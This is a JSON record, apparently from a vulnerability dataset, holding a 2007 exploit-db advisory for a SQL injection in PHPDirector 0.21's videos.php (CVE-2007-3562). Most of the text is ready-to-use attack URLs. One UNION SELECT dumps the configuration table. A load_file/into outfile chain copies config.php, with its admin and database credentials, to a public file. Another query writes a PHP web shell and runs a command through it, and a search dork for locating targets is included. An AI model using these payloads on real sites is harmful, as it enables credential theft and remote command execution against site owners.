{
  "id": "4139",
  "title": "PHPDirector 0.21 - &#039;videos.php?id&#039; SQL Injection",
  "cve": "CVE-2007-3562",
  "vuln_type": "sqli",
  "code": "PHPDirector <= 0.21 (SQL injection/Upload SHELL) Remote Vulnerabilities\r\n\r\nWEB APP: PHPDirector 0.21\r\nSITE: http://www.phpdirector.co.uk/site/\r\nDORK: \"Powered by PHP Director\"\r\n\r\nAUTHOR: Kw3rLn [ teh_lost_byte[at]YaHoO[d0t]Com ]\r\n\r\n* Romanian Security Team [Ethical Hacking] - hTTp://RSTZONE.nET\r\n\r\nDESCRIPTION: - SQL injection in $id of videos.php\r\n             - admin & password are in config.php :-(\r\n             - Path disclosure\r\n             - It doesn`t deserve to make an sploit\r\n\r\nEXPLOIT:\r\n\r\nSQL INJECTION: http://www.site.com/videos.php?id=-1%20UNION%20SELECT%20name,news,vids_per_page,version,template,6,7,8,9,10,11,12,13,14,15%20FROM%20pp_config\r\n\r\nFIND ADMIN PASS & DB INFO:\r\n1. We must have teh path .. check: http://www.site.com/videos.php?id[]= (path disclosure)\r\n2. http://www.site.com/videos.php?id=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,load_file('[path_you_just_found]/config.php')%20FROM%20pp_config%20into%20outfile%20'[path_you_just_found]/config.txt'\r\n3. Now check: http://www.site.com/config.txt\r\n\r\nUPLOAD SHELL:\r\n1. We must have teh path .. check: http://www.site.com/videos.php?id[]= (path disclosure)\r\n2. http://www.site.com/videos.php?id=-1%20UNION%20SELECT%201,'<?php%20system($_GET[cmd]);%20?>',3,4,5,6,7,8,9,10,11,12,13,14,15%20INTO%20OUTFILE%20'[path_founded]/shell.php'%20FROM%20pp_config\r\n3. http://www.site.com/shell.php?cmd=uname -a\r\n\r\n\r\nGREETZ: all memberz of RST and milw0rm\r\n//kw3rln [http://rstzone.net]\r\n\r\n# milw0rm.com [2007-07-02]",
  "url": "https://www.exploit-db.com/exploits/4139"
}